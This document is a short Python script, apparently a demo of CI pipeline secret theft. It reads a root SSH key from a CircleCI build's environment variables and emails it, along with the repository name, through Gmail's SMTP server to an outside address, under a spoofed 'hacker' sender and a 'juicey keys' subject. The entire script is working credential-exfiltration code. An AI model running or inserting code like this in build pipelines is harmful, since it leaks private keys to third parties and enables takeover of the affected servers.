import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import os

s = smtplib.SMTP(host="smtp.gmail.com", port=587)
s.starttls()
s.ehlo()
s.login("afakeemailforaccidemo@gmail.com", os.environ["EMAILPASSWORD"])

msg = MIMEMultipart()
msg['From']="hacker@h4x.0rz"
msg['To']="jacob@jrahme.ca"
msg['Subject']="juicey keys"

root_key = os.environ["ROOT_SSH_KEY"]

msg.attach(MIMEText("root ssh key for " + os.environ["CIRCLE_PROJECT_REPONAME"] + " is " + root_key, 'plain'))


s.send_message(msg)
